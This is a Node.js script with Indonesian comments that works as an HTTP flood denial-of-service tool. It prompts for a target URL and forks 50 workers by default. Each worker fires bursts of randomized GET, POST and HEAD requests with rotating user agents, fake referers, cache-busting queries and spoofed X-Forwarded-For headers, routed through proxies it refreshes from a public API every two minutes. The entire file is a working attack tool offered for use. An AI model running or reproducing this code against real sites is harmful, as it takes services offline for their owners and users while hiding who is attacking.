const axios = require('axios');
const { fork } = require('child_process');
const fs = require('fs');
const readline = require('readline');
const https = require('https');
const http = require('http');
const HttpsProxyAgent = require('https-proxy-agent');
const dns = require('dns');

// User Agents
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64)',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)',
  'Mozilla/5.0 (Linux; Android 11; SM-G991B)',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0'
];

// Referers
const referers = [
  'https://www.google.com/',
  'https://www.bing.com/',
  'https://www.yahoo.com/',
  'https://duckduckgo.com/',
  'https://www.facebook.com/',
  'https://twitter.com/'
];

// Paths untuk random URL path
const paths = ['/login', '/search', '/profile', '/home', '/api/v1/data', '/about', '/contact'];

// HTTP methods
const methods = ['GET', 'POST', 'HEAD'];

// Proxy list global
let proxyList = [];

// Load proxies dari file
function loadProxiesFromFile() {
  try {
    const raw = fs.readFileSync('./proxies.txt', 'utf-8');
    proxyList = raw.split(/\r?\n/).filter(p => p.startsWith('http'));
    console.log(`📡 ${proxyList.length} proxy berhasil dimuat dari proxies.txt`);
  } catch (e) {
    console.warn('⚠️ proxies.txt tidak ditemukan, lanjut tanpa proxy.');
    proxyList = [];
  }
}

// Auto-refresh proxy dari API tiap 2 menit
async function updateProxyListFromAPI() {
  try {
    const res = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=1000&country=all&ssl=all&anonymity=all');
    const apiProxies = res.data.split('\n').filter(p => p.includes(':'));
    proxyList = [...new Set([...proxyList, ...apiProxies])]; // gabung unik
    console.log(`🔄 Proxy terupdate, total: ${proxyList.length}`);
  } catch (err) {
    console.warn('⚠️ Gagal update proxy dari API');
  }
}

// Random helper
function randomFrom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join('.');
}

function randomQuery() {
  return `?id=${Math.floor(Math.random() * 999999)}&rand=${Math.random().toString(36).slice(2, 8)}`;
}

function randomPath() {
  return randomFrom(paths);
}

// Keep-Alive agent global
const keepAliveAgentHttp = new http.Agent({ keepAlive: true });
const keepAliveAgentHttps = new https.Agent({ keepAlive: true });

// DNS resolver untuk target domain (optional)
function resolveTargetIP(target) {
  return new Promise((resolve) => {
    try {
      const hostname = new URL(target).hostname;
      dns.resolve4(hostname, (err, addresses) => {
        if (!err && addresses.length > 0) resolve(addresses[0]);
        else resolve(null);
      });
    } catch {
      resolve(null);
    }
  });
}

// Request sender
async function sendRequest(target) {
  const userAgent = randomFrom(userAgents);
  const referer = randomFrom(referers);
  const spoofIP = randomIP();
  const proxy = proxyList.length > 0 ? randomFrom(proxyList) : null;
  const method = randomFrom(methods);
  const path = randomPath();

  const headers = {
    'User-Agent': userAgent,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Referer': referer,
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'X-Forwarded-For': spoofIP,
    'Host': new URL(target).hostname
  };

  let options = {
    headers,
    timeout: 7000,
    httpAgent: keepAliveAgentHttp,
    httpsAgent: keepAliveAgentHttps,
    method
  };

  if (proxy) {
    try {
      const agent = new HttpsProxyAgent(proxy);
      options.httpAgent = agent;
      options.httpsAgent = agent;
    } catch {}
  }

  const url = target + path + randomQuery();

  try {
    let res;
    if (method === 'POST') {
      res = await axios.post(url, {}, options);
    } else if (method === 'HEAD') {
      res = await axios.head(url, options);
    } else {
      res = await axios.get(url, options);
    }
    const msg = `✅ [${method}] via ${proxy || 'no proxy'} - UA: ${userAgent} - Status: ${res.status}`;
    process.send && process.send(msg);
    fs.appendFileSync('logs.txt', `[${new Date().toISOString()}] ${msg}\n`);
  } catch (err) {
    const msg = `❌ [${method}] via ${proxy || 'no proxy'} - Error: ${err.code || err.message}`;
    process.send && process.send(msg);
    fs.appendFileSync('logs.txt', `[${new Date().toISOString()}] ${msg}\n`);
  }
}

// Worker function: multi-request per loop + delay acak + burst
function workerFlood(target) {
  const burst = Math.random() < 0.2;
  const repeat = burst ? 20 : 5;

  for (let i = 0; i < repeat; i++) {
    sendRequest(target);
  }

  setTimeout(() => workerFlood(target), burst ? 100 : Math.floor(Math.random() * 40) + 20);
}

// Main worker entry
if (process.argv[2] === 'worker') {
  const target = process.argv[3];
  workerFlood(target);
  return;
}

// CLI interface
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

loadProxiesFromFile();
updateProxyListFromAPI();
setInterval(updateProxyListFromAPI, 120000); // refresh proxy tiap 2 menit

rl.question('🌐 Masukkan target URL: ', (targetInput) => {
  const target = targetInput.trim();
  if (!target) {
    console.log('❌ Target tidak boleh kosong!');
    rl.close();
    process.exit(1);
  }
  rl.question('⚙️ Masukkan jumlah worker (default 50): ', (workersInput) => {
    const numWorkers = parseInt(workersInput) || 50;
    rl.close();

    console.log(`🚀 Menyerang ${target} dengan ${numWorkers} worker...`);

    for (let i = 0; i < numWorkers; i++) {
      const worker = fork(__filename, ['worker', target]);
      worker.on('message', msg => console.log(`Worker ${i}: ${msg}`));
      worker.on('exit', code => console.log(`Worker ${i} keluar dengan kode ${code}`));
    }
  });
});
